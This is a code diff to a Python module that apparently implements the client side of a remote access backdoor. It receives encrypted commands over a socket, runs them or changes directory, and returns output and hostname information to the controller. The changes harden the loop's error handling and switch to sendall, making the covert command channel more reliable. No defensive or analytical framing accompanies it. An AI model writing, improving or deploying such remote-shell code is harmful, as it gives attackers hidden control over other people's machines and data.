@@ -29,7 +29,9 @@ def shell_rn(conn: socket.socket, key: bytes) -> None:
     while True:
         try:
             command = _decrypt_fs(conn.recv(1024), key).decode().strip()
-        except AttributeError:
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            break
+        except Exception:
             continue
         if command == "GTINFO":
             conn.sendall(_encrypt_fs(f"{socket.gethostname()}[{getcwd()}]", key))
@@ -38,13 +40,13 @@ def shell_rn(conn: socket.socket, key: bytes) -> None:
         elif command.startswith("cd"):
             parts = command.split(" ", 1)
             if len(parts) == 1:
-                conn.send(_encrypt_fs("So where?", key))
+                conn.sendall(_encrypt_fs("So where?", key))
             else:
                 try:
                     chdir(parts[1].strip())
-                    conn.send(_encrypt_fs("None", key))
+                    conn.sendall(_encrypt_fs("None", key))
                 except Exception:
-                    conn.send(_encrypt_fs(f"cd: {parts[1].strip()}: No such file or directory", key))
+                    conn.sendall(_encrypt_fs(f"cd: {parts[1].strip()}: No such file or directory", key))
         else:
             if "bash" in command:
                 conn.sendall(_encrypt_fs("What do you want from me ?!", key))
@@ -55,16 +57,19 @@ def shell_rn(conn: socket.socket, key: bytes) -> None:
                     out = e
                 try:
                     conn.sendall(_encrypt_fs(out, key))
-                except AttributeError:
+                except Exception:
                     conn.sendall(_encrypt_fs("None", key))
 
 
 def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
     while True:
         sleep(0.25)
-        if command == "RMCM":
-            shell_rn(conn, key)
-            conn.send(b"END")
-            break
-        else:
+        try:
+            if command == "RMCM":
+                shell_rn(conn, key)
+                conn.send(b"END")
+                break
+            else:
+                break
+        except Exception:
             break
